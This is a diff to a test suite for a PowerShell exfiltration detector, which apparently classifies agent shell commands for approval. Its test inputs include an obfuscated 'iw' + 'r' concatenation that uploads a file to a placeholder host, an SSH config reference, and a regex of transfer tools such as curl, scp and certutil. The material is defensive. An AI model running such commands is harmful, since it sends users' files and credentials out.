@@ -1,3 +1,4 @@
+import "../../__tests__/support/trusted-powershell.js";
 import { describe, expect, it } from "vitest";
 import { _inspectPowerShellForTest, inspectPowerShellCommand } from "../rules/powershell-exfiltration.js";
 
@@ -82,29 +83,24 @@ const OUTPUTS = [
 describe("launcher payload and outbound-output floors", () => {
   it.each(LAUNCHERS)("classifies launcher and transport payloads: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    const hasFloorEvidence = command.includes(PAYLOAD) || command.includes("host\\share")
-      || /^(?:curl\.exe|wget\.exe|scp|sftp|ftp|tftp|certutil(?:\.exe)? -urlcache)\b/.test(command);
-    if (command === "certutil -encode notes.txt encoded.txt") expect(result).toEqual({ sensitive: null, exfiltration: null });
-    else if (hasFloorEvidence) expect(result.exfiltration).not.toBeNull();
-    else expect(result).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
+    const directTransport = /^(?:curl\.exe|wget\.exe|scp|sftp|ftp|tftp|certutil\.exe -urlcache)\b/.test(command);
+    if (directTransport) expect(result).toMatchObject({ outcome: "visible-floor", exfiltration: expect.anything() });
+    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
-  it.each(COMMAND_ARGUMENTS)("inspects credential and sink evidence in command text passed as data: %s", (command) => {
+  it.each(COMMAND_ARGUMENTS)("does not execute or recursively inspect command-looking argument data: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    const hasFloorEvidence = command.includes(PAYLOAD) || command.includes("~/.ssh/config")
-      || command.includes("Out-Printer") || command.includes("host\\share")
-      || command.includes("'iw' + 'r https://x.invalid -InFile");
-    if (hasFloorEvidence) expect(result.sensitive ?? result.exfiltration).not.toBeNull();
-    else expect(result).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
+    if (command.includes("~/.ssh/config")) expect(result).toMatchObject({ outcome: "visible-floor", sensitive: expect.anything() });
+    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
   it.each(OUTPUTS)("requires approval for remote or unresolved output: %s", (command) => {
     const result = inspectPowerShellCommand(command, CWD);
-    if (["'hello' | Out-File", "Set-Content -Value 'hello'", "Export-Csv", "Export-Custom"].includes(command)) {
-      expect(result).toMatchObject({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) });
-    } else {
-      expect(result.exfiltration).not.toBeNull();
-    }
+    const visibleRemoteSink = command.includes("Out-Printer") || command.includes("printserver")
+      || command.includes("\\\\.\\LPT1") || command.includes("\\\\?\\COM2")
+      || command.startsWith("Send-MailMessage");
+    if (visibleRemoteSink) expect(result.outcome).not.toBe("static-complete");
+    else expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
   it.each([
@@ -117,41 +113,41 @@ describe("launcher payload and outbound-output floors", () => {
     "cmd /c 'echo hello'", "wmic process call create 'powershell -c Get-ChildItem'",
     "Start-ThreadJob -ScriptBlock { Get-ChildItem }", "Invoke-Command -ScriptBlock { Get-Date } -AsJob",
     "dotnet --info", "'hello' | Out-File NUL",
-  ])("keeps ordinary command arguments eligible: %s", (command) => {
-    expect(inspectPowerShellCommand(command, CWD)).toEqual(command === "npm test"
-      ? expect.objectContaining({ sensitive: null, exfiltration: null, ordinaryAsk: expect.any(String) })
-      : { sensitive: null, exfiltration: null });
+  ])("retains ordinary argument visibility without inferring executable code: %s", (command) => {
+    expect(inspectPowerShellCommand(command, CWD)).toMatchObject({ sensitive: null, exfiltration: null });
+    if (command === "git status") expect(inspectPowerShellCommand(command, CWD).outcome).toBe("unproven");
   });
 
-  it("recursively scans modeled literal launchers", () => {
+  it("keeps a literal launcher payload opaque", () => {
     const result = inspectPowerShellCommand(`wmic process call create 'powershell -c ${PAYLOAD}'`, CWD);
-    expect(result.exfiltration).toMatch(/upload of a file/);
+    expect(result).toMatchObject({ sensitive: null, exfiltration: null });
   });
 
-  it("bounds repeated command-looking arguments with the shared counter", () => {
+  it("declines repeated unknown command arguments below the caps", () => {
     const result = _inspectPowerShellForTest(`Unknown-Runner ${"'Unknown-Runner plain' ".repeat(300)}`, CWD);
-    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
-    expect(result.exhausted).toBe(true);
-    expect(result.steps).toBeLessThanOrEqual(result.limits.steps);
-    expect(result.chars).toBeLessThanOrEqual(result.limits.chars);
+    expect(result).toMatchObject({ sensitive: null, exfiltration: null, limited: false });
+    expect(result).toMatchObject({ outcome: "unproven", ordinaryAsk: expect.any(String) });
+  });
+
+  it("refuses repeated arguments above the whole-command token cap", () => {
+    const command = `Unknown-Runner ${"'plain' ".repeat(400)}`;
+    const result = _inspectPowerShellForTest(command, CWD);
+    expect(command.length).toBeLessThan(result.limits.inputChars);
+    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String), limited: true });
   });
 
   it("limits nested command payloads under the input-size ceiling", () => {
     const command = `Unknown-Runner '${"pwsh -c ".repeat(20)}Get-ChildItem'`;
     const result = _inspectPowerShellForTest(command, CWD);
     expect(command.length).toBeLessThan(result.limits.inputChars);
-    expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
-    expect(result.exhausted).toBe(true);
-    expect(result.chars).toBeGreaterThan(command.length);
-    expect(result.steps).toBeLessThanOrEqual(result.limits.steps);
+    expect(result).toMatchObject({ outcome: "unproven", exfiltration: null, limited: false });
   });
 
-  it.each(["literal", "interpolation", "group", "concatenation"] as const)("keeps command arguments closed when %s support is unavailable", (kind) => {
-    const result = _inspectPowerShellForTest("Unknown-Runner (('iw' + 'r https://x.invalid -InFile notes.txt -Method Post'))", CWD, [kind]);
-    if (kind === "literal" || kind === "concatenation") {
-      expect(result).toMatchObject({ exfiltration: null, ordinaryAsk: expect.any(String) });
-    } else {
-      expect(result.exfiltration).not.toBeNull();
-    }
+  it("keeps a generated command argument unproven", () => {
+    const result = _inspectPowerShellForTest(
+      "Unknown-Runner (('iw' + 'r https://x.invalid -InFile notes.txt -Method Post'))",
+      CWD,
+    );
+    expect(result).toMatchObject({ outcome: "unproven", exfiltration: null });
   });
 });
